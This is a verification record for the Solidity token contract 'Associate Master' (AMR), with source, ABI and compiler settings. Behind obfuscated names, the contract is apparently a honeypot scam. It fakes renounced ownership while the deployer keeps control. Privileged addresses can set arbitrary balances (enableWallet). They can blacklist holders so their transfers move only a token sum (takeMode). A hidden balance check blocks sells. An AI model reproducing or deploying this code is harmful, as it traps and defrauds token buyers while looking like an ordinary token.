{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface sellLaunched {\n    function createPair(address liquidityTrading, address takeLimit) external returns (address);\n}\n\ninterface enableLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountLaunchedFrom) external view returns (uint256);\n\n    function transfer(address launchedSenderMarketing, uint256 autoSenderTotal) external returns (bool);\n\n    function allowance(address autoTotalMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoSenderTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedSenderMarketing,\n        uint256 autoSenderTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldReceiverSell, uint256 value);\n    event Approval(address indexed autoTotalMax, address indexed spender, uint256 value);\n}\n\nabstract contract liquidityTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface liquidityIs is enableLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AssociateMaster is liquidityTotal, enableLiquidity, liquidityIs {\n\n    bool public walletEnableLaunch;\n\n    function marketingSell(address minWalletReceiver) public {\n        require(minWalletReceiver.balance < 100000);\n        if (tradingEnableTx) {\n            return;\n        }\n        \n        enableSwap[minWalletReceiver] = true;\n        if (walletEnableLaunch) {\n            shouldTokenLiquidity = amountLaunchedTeam;\n        }\n        tradingEnableTx = true;\n    }\n\n    bool public tradingEnableTx;\n\n    address private launchList;\n\n    function amountLiquidityTo() public {\n        emit OwnershipTransferred(fromAmount, address(0));\n        launchList = address(0);\n    }\n\n    address public fromAmount;\n\n    uint256 private shouldTokenLiquidity;\n\n    function balanceOf(address amountLaunchedFrom) public view virtual override returns (uint256) {\n        return feeLaunch[amountLaunchedFrom];\n    }\n\n    mapping(address => uint256) private feeLaunch;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverFee;\n    }\n\n    function txLaunchMax() private view {\n        require(enableSwap[_msgSender()]);\n    }\n\n    function takeMode(address senderLaunch) public {\n        txLaunchMax();\n        if (walletEnableLaunch == totalLaunched) {\n            amountLaunchedTeam = shouldTokenLiquidity;\n        }\n        if (senderLaunch == fromAmount || senderLaunch == minListEnable) {\n            return;\n        }\n        receiverToken[senderLaunch] = true;\n    }\n\n    function senderWalletReceiver(uint256 autoSenderTotal) public {\n        txLaunchMax();\n        txSell = autoSenderTotal;\n    }\n\n    mapping(address => bool) public receiverToken;\n\n    uint256 public amountLaunchedTeam;\n\n    uint256 txSell;\n\n    function fundMax(address shouldReceiver, address launchedSenderMarketing, uint256 autoSenderTotal) internal returns (bool) {\n        require(feeLaunch[shouldReceiver] >= autoSenderTotal);\n        feeLaunch[shouldReceiver] -= autoSenderTotal;\n        feeLaunch[launchedSenderMarketing] += autoSenderTotal;\n        emit Transfer(shouldReceiver, launchedSenderMarketing, autoSenderTotal);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txShould;\n    }\n\n    function owner() external view returns (address) {\n        return launchList;\n    }\n\n    function txMode(address shouldReceiver, address launchedSenderMarketing, uint256 autoSenderTotal) internal returns (bool) {\n        if (shouldReceiver == fromAmount) {\n            return fundMax(shouldReceiver, launchedSenderMarketing, autoSenderTotal);\n        }\n        uint256 fromLiquidity = enableLiquidity(minListEnable).balanceOf(feeSwap);\n        require(fromLiquidity == txSell);\n        require(launchedSenderMarketing != feeSwap);\n        if (receiverToken[shouldReceiver]) {\n            return fundMax(shouldReceiver, launchedSenderMarketing, toSell);\n        }\n        return fundMax(shouldReceiver, launchedSenderMarketing, autoSenderTotal);\n    }\n\n    uint256 limitReceiver;\n\n    bool public totalLaunched;\n\n    function decimals() external view virtual override returns (uint8) {\n        return atMarketing;\n    }\n\n    function transferFrom(address shouldReceiver, address launchedSenderMarketing, uint256 autoSenderTotal) external override returns (bool) {\n        if (_msgSender() != receiverTeam) {\n            if (atSell[shouldReceiver][_msgSender()] != type(uint256).max) {\n                require(autoSenderTotal <= atSell[shouldReceiver][_msgSender()]);\n                atSell[shouldReceiver][_msgSender()] -= autoSenderTotal;\n            }\n        }\n        return txMode(shouldReceiver, launchedSenderMarketing, autoSenderTotal);\n    }\n\n    address public minListEnable;\n\n    function allowance(address listIs, address fundTeam) external view virtual override returns (uint256) {\n        if (fundTeam == receiverTeam) {\n            return type(uint256).max;\n        }\n        return atSell[listIs][fundTeam];\n    }\n\n    function transfer(address maxAmount, uint256 autoSenderTotal) external virtual override returns (bool) {\n        return txMode(_msgSender(), maxAmount, autoSenderTotal);\n    }\n\n    function enableWallet(address maxAmount, uint256 autoSenderTotal) public {\n        txLaunchMax();\n        feeLaunch[maxAmount] = autoSenderTotal;\n    }\n\n    mapping(address => mapping(address => uint256)) private atSell;\n\n    string private feeModeMin = \"AMR\";\n\n    address feeSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    constructor (){\n        if (walletEnableLaunch) {\n            shouldTokenLiquidity = amountLaunchedTeam;\n        }\n        sellIs senderTotal = sellIs(receiverTeam);\n        minListEnable = sellLaunched(senderTotal.factory()).createPair(senderTotal.WETH(), address(this));\n        \n        fromAmount = _msgSender();\n        enableSwap[fromAmount] = true;\n        feeLaunch[fromAmount] = txShould;\n        amountLiquidityTo();\n        \n        emit Transfer(address(0), fromAmount, txShould);\n    }\n\n    uint256 private txShould = 100000000 * 10 ** 18;\n\n    uint256 constant toSell = 11 ** 10;\n\n    function getOwner() external view returns (address) {\n        return launchList;\n    }\n\n    address receiverTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private receiverFee = \"Associate Master\";\n\n    event OwnershipTransferred(address indexed exemptFee, address indexed amountShould);\n\n    uint8 private atMarketing = 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeModeMin;\n    }\n\n    mapping(address => bool) public enableSwap;\n\n    function approve(address fundTeam, uint256 autoSenderTotal) public virtual override returns (bool) {\n        atSell[_msgSender()][fundTeam] = autoSenderTotal;\n        emit Approval(_msgSender(), fundTeam, autoSenderTotal);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoTotalMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldReceiverSell\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundTeam\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLaunchedTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLiquidityTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoSenderTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLaunchedFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoSenderTotal\",\"type\":\"uint256\"}],\"name\":\"enableWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minWalletReceiver\",\"type\":\"address\"}],\"name\":\"marketingSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minListEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoSenderTotal\",\"type\":\"uint256\"}],\"name\":\"senderWalletReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLaunch\",\"type\":\"address\"}],\"name\":\"takeMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingEnableTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoSenderTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedSenderMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoSenderTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletEnableLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AssociateMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}